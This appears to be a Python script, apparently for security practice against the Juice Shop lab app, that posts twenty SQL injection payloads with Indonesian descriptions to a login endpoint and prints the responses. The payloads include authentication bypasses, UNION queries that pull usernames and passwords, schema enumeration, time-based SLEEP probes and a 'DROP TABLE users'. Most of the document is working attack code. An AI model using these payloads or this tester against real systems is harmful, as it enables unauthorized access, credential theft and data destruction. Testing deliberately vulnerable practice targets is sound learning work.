Pengujian Analisis Auto Respon API

```python
import requests
#from requests.exceptions import SSLError, ConnectionError
#import ssl
#import json
```

```python
# URL API Juice Shop yang akan diuji
#url = "http://localhost:3000/rest/user/login"
url = "https://postman-echo.com/post"
# Header untuk permintaan
headers = {
    "Content-Type": "application/json"
}

# Daftar payload injeksi SQL untuk pengujian dengan penjelasan
sql_injection_payloads = [
    ("' OR '1'='1'", "Bypass autentikasi dengan kondisi selalu benar"),
    ("' OR 1=1; --", "Bypass autentikasi dengan kondisi selalu benar dan menghentikan query asli"),
    ("'; DROP TABLE users; --", "Menghapus tabel pengguna"),
    ("' UNION SELECT * FROM users; --", "Menggabungkan query untuk mengambil semua data dari tabel pengguna"),
    ("' UNION SELECT table_name, NULL, NULL FROM information_schema.tables; --", "Menampilkan nama tabel dalam database"),
    ("' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name = 'users'; --", "Menampilkan kolom dari tabel pengguna"),
    ("' AND 1=CONVERT(int, (SELECT @@version)); --", "Menyebabkan kesalahan dengan konversi data"),
    ("' AND EXISTS(SELECT * FROM users WHERE username = 'admin'); --", "Memeriksa apakah ada pengguna dengan nama 'admin'"),
    ("' UNION SELECT @@version, NULL, NULL; --", "Menampilkan versi database"),
    ("' UNION SELECT username, password FROM users; --", "Menampilkan nama pengguna dan kata sandi dari tabel pengguna"),
    ("' UNION SELECT u.username, u.password FROM users u JOIN roles r ON u.role_id = r.id; --", "Melakukan join pada tabel lain"),
    ("' UNION SELECT (SELECT password FROM users WHERE username='admin'), NULL; --", "Menggunakan subquery untuk menampilkan kata sandi pengguna 'admin'"),
    ("' AND (SELECT COUNT(*) FROM users) > 0; --", "Menggunakan subquery untuk memeriksa jumlah pengguna"),
    ("' OR 'x'='x'; --", "Bypass autentikasi dengan kondisi selalu benar menggunakan nilai yang berbeda"),
    ("' UNION SELECT @@version_comment, NULL, NULL; --", "Menampilkan komentar versi database MySQL"),
    ("' UNION SELECT database(), NULL, NULL; --", "Menampilkan nama database saat ini"),
    ("' UNION SELECT user(), NULL, NULL; --", "Menampilkan nama pengguna saat ini"),
    ("' UNION SELECT host, NULL, NULL FROM mysql.user; --", "Menampilkan host dari mana koneksi dibuat"),
    ("' OR SLEEP(5); --", "Menunda respons dengan menggunakan fungsi SLEEP"),
    ("' AND IF(1=1, SLEEP(5), 0); --", "Menggunakan kondisi untuk menunda respons dengan SLEEP")
]

# Menguji setiap payload
for i, (payload, description) in enumerate(sql_injection_payloads):
    data = {
        "email": payload,
        "password": "password"
    }
    response = requests.post(url, json=data, headers=headers)
    print(f"Test {i+1}:")
    print("Description:", description)
    print("Payload:", payload)
    print("Status Code:", response.status_code)
    print("Response Body:", response.text)
    print("------")
```
